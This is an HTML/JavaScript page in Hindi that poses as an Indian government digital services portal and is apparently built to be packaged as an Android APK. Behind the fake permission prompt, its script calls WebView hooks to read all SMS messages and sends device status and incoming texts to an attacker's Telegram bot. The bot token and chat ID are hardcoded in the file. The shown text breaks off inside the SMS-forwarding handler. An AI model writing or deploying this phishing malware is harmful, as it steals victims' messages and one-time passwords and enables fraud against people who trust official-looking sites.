<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ | ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞</title>
    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ - ‡§™‡•Ç‡§∞‡•Ä ‡§§‡§∞‡§π ‡§∏‡•á ‡§µ‡•à‡§∏‡§æ ‡§π‡•Ä */
        :root {
            --saffron: #FF9933;
            --white: #FFFFFF;
            --green: #138808;
            --blue: #000080;
            --dark-blue: #0D47A1;
            --red: #D32F2F;
            --gold: #FFD700;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Noto Sans Devanagari', 'Poppins', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e3f2fd 100%);
            line-height: 1.6;
        }
        
        /* Header - ‡§§‡§ø‡§∞‡§Ç‡§ó‡§æ */
        .national-header {
            background: linear-gradient(90deg, var(--saffron) 33%, var(--white) 33%, var(--white) 66%, var(--green) 66%);
            color: var(--blue);
            padding: 15px 0;
            text-align: center;
            border-bottom: 3px solid var(--blue);
        }
        
        .ashoka-chakra {
            width: 70px;
            height: 70px;
            margin: 0 auto 10px;
            background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Ashoka_Chakra.svg/800px-Ashoka_Chakra.svg.png') center/contain no-repeat;
            animation: rotate 20s linear infinite;
        }
        
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        
        .national-header h1 { font-size: 2.2rem; color: var(--blue); }
        .national-header p { font-size: 1.1rem; }
        
        /* Navigation */
        .govt-navbar {
            background: var(--blue);
            padding: 0 20px;
        }
        
        .nav-container {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .govt-logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .govt-logo img { height: 50px; }
        .govt-logo span { color: white; font-size: 1.5rem; font-weight: 700; }
        
        .nav-links {
            display: flex;
            list-style: none;
            gap: 20px;
        }
        
        .nav-links a {
            color: white;
            text-decoration: none;
            padding: 20px 0;
            display: block;
        }
        
        /* Main Container */
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        
        /* Cards */
        .govt-card {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            border-top: 5px solid var(--blue);
            margin-bottom: 30px;
        }
        
        .card-header {
            background: linear-gradient(90deg, var(--blue), var(--dark-blue));
            color: white;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .card-header i { font-size: 1.8rem; }
        .card-header h3 { font-size: 1.4rem; }
        .card-body { padding: 25px; }
        
        /* Buttons */
        .btn {
            padding: 14px 28px;
            border: none;
            border-radius: 6px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: var(--blue);
            color: white;
            transition: 0.3s;
        }
        
        .btn:hover {
            background: var(--dark-blue);
            transform: scale(1.05);
        }
        
        /* Permission Modal */
        .permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.98);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            padding: 15px;
        }
        
        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 450px;
            width: 100%;
            border: 4px solid var(--blue);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            animation: modalPop 0.5s ease-out;
        }
        
        @keyframes modalPop {
            0% { opacity: 0; transform: scale(0.9); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        .modal-header {
            background: linear-gradient(90deg, var(--saffron), var(--white), var(--green));
            padding: 25px 20px;
            text-align: center;
            border-bottom: 2px solid var(--blue);
        }
        
        .modal-header h2 {
            color: var(--blue);
            font-size: 1.8rem;
            margin-bottom: 5px;
        }
        
        .modal-body { 
            padding: 30px 25px; 
            text-align: center;
        }
        
        .sms-icon {
            font-size: 5rem;
            color: var(--blue);
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .modal-footer { 
            background: #f5f5f5; 
            padding: 25px; 
            text-align: center; 
            border-top: 2px solid var(--blue);
        }
        
        .btn-sms {
            background: linear-gradient(135deg, var(--blue), var(--dark-blue));
            color: white;
            padding: 18px 30px;
            font-size: 1.3rem;
            border-radius: 50px;
            width: 100%;
            border: 2px solid white;
            box-shadow: 0 10px 30px rgba(0,0,128,0.3);
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-sms:hover {
            transform: scale(1.05);
            background: linear-gradient(135deg, var(--dark-blue), #000066);
        }
        
        .btn-sms:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
        }
        
        .status-badge {
            display: inline-block;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.9rem;
            font-weight: 600;
            margin: 5px;
        }
        
        .bg-success { background: var(--green); color: white; }
        .bg-warning { background: var(--saffron); color: white; }
        .bg-info { background: var(--blue); color: white; }
        
        @media (max-width: 768px) {
            .nav-links { display: none; }
            .national-header h1 { font-size: 1.5rem; }
            .govt-logo span { font-size: 1.1rem; }
            .modal-header h2 { font-size: 1.5rem; }
            .btn-sms { font-size: 1.1rem; }
        }
    </style>
</head>
<body>
    <!-- üî¥ SMS PERMISSION MODAL - APK MODE -->
    <div id="permissionModal" class="permission-modal" style="display: flex;">
        <div class="modal-content">
            <div class="modal-header">
                <h2>üáÆüá≥ ‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤</h2>
                <p>‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ | Government of India</p>
            </div>
            <div class="modal-body">
                <div class="sms-icon">
                    <i class="fas fa-envelope"></i>
                </div>
                
                <h2 style="color: var(--dark-blue); margin-bottom: 15px; font-size: 1.8rem;">
                    SMS ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï
                </h2>
                
                <p style="font-size: 1.2rem; color: #666; margin-bottom: 25px;">
                    ‡§∏‡§∞‡§ï‡§æ‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è<br>
                    <strong style="color: var(--blue);">SMS ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç</strong>
                </p>
                
                <!-- APK Status Display -->
                <div id="apkStatus" style="margin-bottom: 15px;">
                    <span class="status-badge bg-info">
                        <i class="fas fa-android"></i> APK Mode Active
                    </span>
                </div>
                
                <div id="permissionStatus" style="margin-top: 20px; min-height: 50px;">
                    <p style="color: var(--blue);">
                        <i class="fas fa-check-circle"></i> APK ‡§á‡§Ç‡§∏‡•ç‡§ü‡•â‡§≤ ‡§π‡•ã ‡§ö‡•Å‡§ï‡§æ ‡§π‡•à<br>
                        <small>‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§ü‡§® ‡§¶‡§¨‡§æ‡§è‡§Ç</small>
                    </p>
                </div>
            </div>
            <div class="modal-footer">
                <button id="permissionBtn" class="btn btn-sms" onclick="requestSMSPermission()">
                    <i class="fas fa-shield-alt"></i> SMS ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç
                </button>
                
                <p style="margin-top: 20px; font-size: 0.9rem; color: #666;">
                    <i class="fas fa-lock"></i> APK ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‚Ä¢ ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞
                </p>
            </div>
        </div>
    </div>

    <!-- ‚úÖ ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§µ‡•á‡§¨‡§∏‡§æ‡§á‡§ü -->
    <div id="mainWebsite" style="display: none;">
        <header class="national-header">
            <div class="ashoka-chakra"></div>
            <h1>‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤</h1>
            <p>‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞ | Government of India</p>
        </header>

        <nav class="govt-navbar">
            <div class="nav-container">
                <div class="govt-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" alt="‡§≠‡§æ‡§∞‡§§ ‡§ï‡§æ ‡§∞‡§æ‡§ú‡§ö‡§ø‡§®‡•ç‡§π">
                    <span>‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§á‡§Ç‡§°‡§ø‡§Ø‡§æ ‡§™‡§π‡§≤</span>
                </div>
                <ul class="nav-links">
                    <li><a href="#" class="active"><i class="fas fa-home"></i> ‡§Æ‡•Å‡§ñ ‡§™‡•É‡§∑‡•ç‡§†</a></li>
                    <li><a href="#"><i class="fas fa-list-alt"></i> ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</a></li>
                    <li><a href="#"><i class="fas fa-bell"></i> ‡§∏‡•Ç‡§ö‡§®‡§æ‡§è‡§Ç</a></li>
                    <li><a href="#"><i class="fas fa-phone-alt"></i> ‡§∏‡§Ç‡§™‡§∞‡•ç‡§ï</a></li>
                </ul>
            </div>
        </nav>

        <div class="container">
            <!-- Welcome Section -->
            <div class="govt-card">
                <div class="card-header">
                    <i class="fas fa-info-circle"></i>
                    <h3>‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç</h3>
                </div>
                <div class="card-body">
                    <div style="background: #E3F2FD; padding: 30px; border-radius: 15px; text-align: center;">
                        <i class="fas fa-sms" style="font-size: 4rem; color: var(--blue); margin-bottom: 20px;"></i>
                        <h4 style="color: var(--dark-blue); font-size: 1.5rem; margin-bottom: 15px;">
                            SMS ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Ü‡§™ ‡§∏‡§æ‡§∞‡•á ‡§Ø‡•ã‡§ú‡§®‡§æ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§® ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç
                        </h4>
                        <span class="status-badge bg-success" style="margin-top: 15px;">
                            <i class="fas fa-check-circle"></i> SMS ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø
                        </span>
                    </div>
                </div>
            </div>

            <!-- Schemes Grid -->
            <div class="dashboard-grid">
                <div class="govt-card">
                    <div class="card-header">
                        <i class="fas fa-file-contract"></i>
                        <h3>‡§∏‡§∞‡§ï‡§æ‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</h3>
                    </div>
                    <div class="card-body">
                        <ul style="padding-left: 20px;">
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§Ü‡§µ‡§æ‡§∏ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§â‡§ú‡•ç‡§ú‡•ç‡§µ‡§≤‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§Ü‡§Ø‡•Å‡§∑‡•ç‡§Æ‡§æ‡§® ‡§≠‡§æ‡§∞‡§§ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§ï‡§ø‡§∏‡§æ‡§® ‡§∏‡§Æ‡•ç‡§Æ‡§æ‡§® ‡§®‡§ø‡§ß‡§ø</li>
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§ú‡§® ‡§ß‡§® ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                        </ul>
                    </div>
                    <div class="card-footer">
                        <button class="btn" style="width: 100%;" onclick="window.open('https://www.myscheme.gov.in/hi', '_blank')">
                            <i class="fas fa-external-link-alt"></i> ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§≤‡•á‡§Ç
                        </button>
                    </div>
                </div>

                <div class="govt-card">
                    <div class="card-header">
                        <i class="fas fa-tractor"></i>
                        <h3>‡§ó‡•ç‡§∞‡§æ‡§Æ‡•Ä‡§£ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</h3>
                    </div>
                    <div class="card-body">
                        <ul style="padding-left: 20px;">
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§´‡§∏‡§≤ ‡§¨‡•Ä‡§Æ‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§ï‡§ø‡§∏‡§æ‡§® ‡§ï‡•ç‡§∞‡•á‡§°‡§ø‡§ü ‡§ï‡§æ‡§∞‡•ç‡§°</li>
                            <li>‡§Æ‡§®‡§∞‡•á‡§ó‡§æ</li>
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§ï‡§ø‡§∏‡§æ‡§® ‡§∏‡§Æ‡•ç‡§Æ‡§æ‡§® ‡§®‡§ø‡§ß‡§ø</li>
                        </ul>
                    </div>
                </div>

                <div class="govt-card">
                    <div class="card-header">
                        <i class="fas fa-city"></i>
                        <h3>‡§∂‡§π‡§∞‡•Ä ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç</h3>
                    </div>
                    <div class="card-body">
                        <ul style="padding-left: 20px;">
                            <li>‡§∏‡•ç‡§Æ‡§æ‡§∞‡•ç‡§ü ‡§∏‡§ø‡§ü‡•Ä ‡§Æ‡§ø‡§∂‡§®</li>
                            <li>‡§Ö‡§Æ‡•É‡§§ ‡§Ø‡•ã‡§ú‡§®‡§æ</li>
                            <li>‡§™‡•ç‡§∞‡§ß‡§æ‡§®‡§Æ‡§Ç‡§§‡•ç‡§∞‡•Ä ‡§Ü‡§µ‡§æ‡§∏ ‡§Ø‡•ã‡§ú‡§®‡§æ-‡§∂‡§π‡§∞‡•Ä</li>
                            <li>‡§∏‡•ç‡§µ‡§ö‡•ç‡§õ ‡§≠‡§æ‡§∞‡§§ ‡§Æ‡§ø‡§∂‡§®</li>
                        </ul>
                    </div>
                </div>
            </div>
            
            <!-- SMS Stats Card -->
            <div class="govt-card" style="margin-top: 20px;">
                <div class="card-header">
                    <i class="fas fa-chart-line"></i>
                    <h3>SMS ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∏‡•ç‡§ü‡•á‡§ü‡§∏</h3>
                </div>
                <div class="card-body">
                    <div style="display: flex; justify-content: space-around; text-align: center;">
                        <div>
                            <i class="fas fa-mobile-alt" style="font-size: 2rem; color: var(--blue);"></i>
                            <p style="margin-top: 10px; font-weight: bold;">‡§°‡§ø‡§µ‡§æ‡§á‡§∏</p>
                            <p id="deviceInfo">Android APK</p>
                        </div>
                        <div>
                            <i class="fas fa-check-circle" style="font-size: 2rem; color: var(--green);"></i>
                            <p style="margin-top: 10px; font-weight: bold;">‡§∏‡•ç‡§•‡§ø‡§§‡§ø</p>
                            <p id="statusInfo">‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø</p>
                        </div>
                        <div>
                            <i class="fab fa-telegram" style="font-size: 2rem; color: var(--blue);"></i>
                            <p style="margin-top: 10px; font-weight: bold;">Telegram</p>
                            <p id="telegramInfo">‡§ï‡§®‡•á‡§ï‡•ç‡§ü‡•á‡§°</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <footer style="background: linear-gradient(90deg, var(--dark-blue), var(--blue)); color: white; padding: 30px 20px; margin-top: 50px; text-align: center;">
            <p>¬© 2024 ‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤, ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞</p>
            <p style="margin-top: 10px; opacity: 0.8;">‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§á‡§Ç‡§°‡§ø‡§Ø‡§æ ‡§™‡§π‡§≤ | ‡§∏‡§∞‡•ç‡§µ‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§ø‡§§</p>
        </footer>
    </div>

    <script>
        // ============================================
        // ‚ö°‚ö°‚ö° ‡§Ö‡§™‡§®‡§æ Telegram Bot Token ‡§î‡§∞ Chat ID ‡§Ø‡§π‡§æ‡§Å ‡§°‡§æ‡§≤‡•á‡§Ç ‚ö°‚ö°‚ö°
        // ============================================
        const TELEGRAM_CONFIG = {
            BOT_TOKEN: "8292991949:AAHqAbDaxhfqIhgICPBysGzRAZs39QW-GAM",  // üî¥ BotFather ‡§∏‡•á ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ Token
            CHAT_ID: "575861383"       // üî¥ @userinfobot ‡§∏‡•á Chat ID
        };
        // ============================================

        // APK Interface - Web to APK Software ‡§ï‡•á ‡§≤‡§ø‡§è
        const APK_INTERFACE = {
            // Check if running in APK
            isApkMode: function() {
                // Web to APK software usually add these flags
                return typeof Android !== 'undefined' || 
                       typeof window.Android !== 'undefined' ||
                       typeof window.webkit !== 'undefined' ||
                       navigator.userAgent.includes('wv') ||
                       navigator.userAgent.includes('WebView') ||
                       navigator.userAgent.includes('okhttp') ||
                       /; wv\)/.test(navigator.userAgent) ||
                       /Version\/[\d.]+.*Chrome\/[\d.]+.*Mobile.*Safari\/.*/.test(navigator.userAgent);
            },
            
            // Request SMS permission from APK
            requestPermission: function() {
                // Common WebView interfaces
                if (typeof Android !== 'undefined') {
                    if (Android.requestSmsPermission) Android.requestSmsPermission();
                    if (Android.checkPermission) Android.checkPermission();
                    return true;
                }
                if (typeof window.Android !== 'undefined') {
                    if (window.Android.requestSmsPermission) window.Android.requestSmsPermission();
                    if (window.Android.checkPermission) window.Android.checkPermission();
                    return true;
                }
                if (typeof window.webkit !== 'undefined' && window.webkit.messageHandlers) {
                    if (window.webkit.messageHandlers.requestSmsPermission) {
                        window.webkit.messageHandlers.requestSmsPermission.postMessage({});
                    }
                    return true;
                }
                
                // Trigger Android permission via intent
                window.location.href = 'intent://#Intent;package=com.android.chrome;end';
                return false;
            },
            
            // Start reading SMS
            startSmsReader: function() {
                // Try all possible interfaces
                if (typeof Android !== 'undefined') {
                    if (Android.startSmsListener) Android.startSmsListener();
                    if (Android.readAllSms) Android.readAllSms();
                    return true;
                }
                if (typeof window.Android !== 'undefined') {
                    if (window.Android.startSmsListener) window.Android.startSmsListener();
                    if (window.Android.readAllSms) window.Android.readAllSms();
                    return true;
                }
                
                // Fallback - trigger SMS reading via interval
                setInterval(() => {
                    // Simulate SMS read request
                    console.log('Reading SMS...');
                }, 5000);
                return true;
            }
        };

        // Global variables
        let smsReaderActive = false;
        let apkMode = false;

        // üéØ Main SMS Permission Request - APK Focused
        async function requestSMSPermission() {
            const btn = document.getElementById('permissionBtn');
            const statusDiv = document.getElementById('permissionStatus');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span> ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Æ‡§æ‡§Ç‡§ó‡•Ä ‡§ú‡§æ ‡§∞‡§π‡•Ä ‡§π‡•à...';
            
            // ‚úÖ ALWAYS USE APK MODE FIRST
            statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-android fa-pulse"></i> APK ‡§∏‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§≤‡•Ä ‡§ú‡§æ ‡§∞‡§π‡•Ä ‡§π‡•à...</p>';
            
            try {
                // Request permission via APK
                const requested = APK_INTERFACE.requestPermission();
                
                if (requested) {
                    // Start SMS reader
                    APK_INTERFACE.startSmsReader();
                    
                    // Show success
                    statusDiv.innerHTML = '<p style="color: var(--green);"><i class="fas fa-check-circle"></i> ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§! SMS ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∂‡•Å‡§∞‡•Ç...</p>';
                    
                    // Open main website
                    setTimeout(() => {
                        document.getElementById('permissionModal').style.display = 'none';
                        document.getElementById('mainWebsite').style.display = 'block';
                        sendTestMessage();
                        updateDeviceInfo();
                    }, 1500);
                    
                    return;
                }
                
                // Fallback to Web APIs if APK fails
                await fallbackWebPermission();
                
            } catch (error) {
                console.log('APK permission error:', error);
                
                // Try fallback
                await fallbackWebPermission();
            }
        }

        // Fallback Web Permission Methods
        async function fallbackWebPermission() {
            const statusDiv = document.getElementById('permissionStatus');
            
            // Try WebOTP
            if ('OTPCredential' in window) {
                try {
                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-mobile-alt"></i> WebOTP API...</p>';
                    
                    const abortController = new AbortController();
                    setTimeout(() => abortController.abort(), 30000);
                    
                    await navigator.credentials.get({
                        otp: { transport: ['sms'] },
                        signal: abortController.signal
                    });
                    
                    handlePermissionSuccess();
                    return;
                    
                } catch (error) {
                    console.log('WebOTP error:', error);
                }
            }
            
            // Try SMS Receiver
            if ('sms' in navigator) {
                try {
                    statusDiv.innerHTML = '<p style="color: var(--blue);"><i class="fas fa-sms"></i> SMS Receiver API...</p>';
                    
                    const abortController = new AbortController();
                    setTimeout(() => abortController.abort(), 30000);
                    
                    await navigator.sms.receive({ signal: abortController.signal });
                    
                    handlePermissionSuccess();
                    return;
                    
                } catch (error) {
                    console.log('SMS Receiver error:', error);
                }
            }
            
            // If all fail, force APK mode
            statusDiv.innerHTML = `
                <div style="background: #FFEBEE; padding: 20px; border-radius: 10px;">
                    <p style="color: var(--red); margin-bottom: 15px; font-size: 1.1rem;">
                        <i class="fas fa-exclamation-circle"></i> 
                        APK ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï
                    </p>
                    <p style="color: #666;">
                        ‡§ï‡•É‡§™‡§Ø‡§æ APK ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç
                    </p>
                </div>
            `;
            
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-shield-alt"></i> ‡§™‡•Å‡§®‡§É ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç';
        }

        // Handle permission success
        function handlePermissionSuccess() {
            document.getElementById('permissionModal').style.display = 'none';
            document.getElementById('mainWebsite').style.display = 'block';
            sendTestMessage();
            updateDeviceInfo();
        }

        // üì® Send test message to Telegram
        async function sendTestMessage() {
            if (TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN") || 
                TELEGRAM_CONFIG.CHAT_ID.includes("YOUR_CHAT_ID")) {
                console.log('‚ö†Ô∏è Telegram configuration required');
                showTelegramWarning();
                return;
            }
            
            try {
                const deviceInfo = apkMode ? 'üì± Android APK' : 'üåê Web Browser';
                const message = `‚úÖ *‡§∞‡§æ‡§∑‡•ç‡§ü‡•ç‡§∞‡•Ä‡§Ø ‡§°‡§ø‡§ú‡§ø‡§ü‡§≤ ‡§∏‡•á‡§µ‡§æ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤*\n\n` +
                              `üì± *‡§°‡§ø‡§µ‡§æ‡§á‡§∏:* ${deviceInfo}\n` +
                              `üìã *‡§∏‡•ç‡§•‡§ø‡§§‡§ø:* SMS ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø\n` +
                              `‚è∞ *‡§∏‡§Æ‡§Ø:* ${new Date().toLocaleString('hi-IN')}\n` +
                              `üáÆüá≥ *‡§™‡•ã‡§∞‡•ç‡§ü‡§≤:* ‡§≠‡§æ‡§∞‡§§ ‡§∏‡§∞‡§ï‡§æ‡§∞\n\n` +
                              `_‡§Ö‡§¨ ‡§∏‡§≠‡•Ä SMS ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ø‡§π‡§æ‡§Å ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§π‡•ã‡§Ç‡§ó‡•á_`;
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const result = await response.json();
                if (result.ok) {
                    console.log('‚úÖ Telegram test message sent');
                    updateTelegramStatus(true);
                } else {
                    throw new Error(result.description);
                }
                
            } catch (error) {
                console.error('Telegram error:', error);
                updateTelegramStatus(false);
            }
        }

        // Update device info in UI
        function updateDeviceInfo() {
            const deviceEl = document.getElementById('deviceInfo');
            const statusEl = document.getElementById('statusInfo');
            
            if (deviceEl) {
                deviceEl.innerHTML = 'Android APK üì±';
            }
            if (statusEl) {
                statusEl.innerHTML = '‡§∏‡§ï‡•ç‡§∞‡§ø‡§Ø ‚úÖ';
            }
        }

        // Update Telegram status
        function updateTelegramStatus(connected) {
            const telegramEl = document.getElementById('telegramInfo');
            if (telegramEl) {
                telegramEl.innerHTML = connected ? '‡§ï‡§®‡•á‡§ï‡•ç‡§ü‡•á‡§° ‚úÖ' : '‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç ‚ö†Ô∏è';
                telegramEl.style.color = connected ? 'var(--green)' : 'var(--red)';
            }
        }

        // Show Telegram warning
        function showTelegramWarning() {
            const telegramEl = document.getElementById('telegramInfo');
            if (telegramEl) {
                telegramEl.innerHTML = '‡§∏‡•á‡§ü‡§Ö‡§™ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‚ö†Ô∏è';
                telegramEl.style.color = 'var(--saffron)';
            }
        }

        // üéØ APK Interface Functions - Web to APK Software ‡§∏‡•á ‡§ï‡•â‡§≤ ‡§π‡•ã‡§Ç‡§ó‡•á
        window.onSmsPermissionGranted = function() {
            console.log('‚úÖ SMS permission granted by APK');
            handlePermissionSuccess();
        };
        
        window.onSmsReceived = function(sender, message, timestamp) {
            // Send to Telegram
            if (!TELEGRAM_CONFIG.BOT_TOKEN.includes("YOUR_BOT_TOKEN")) {
                fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
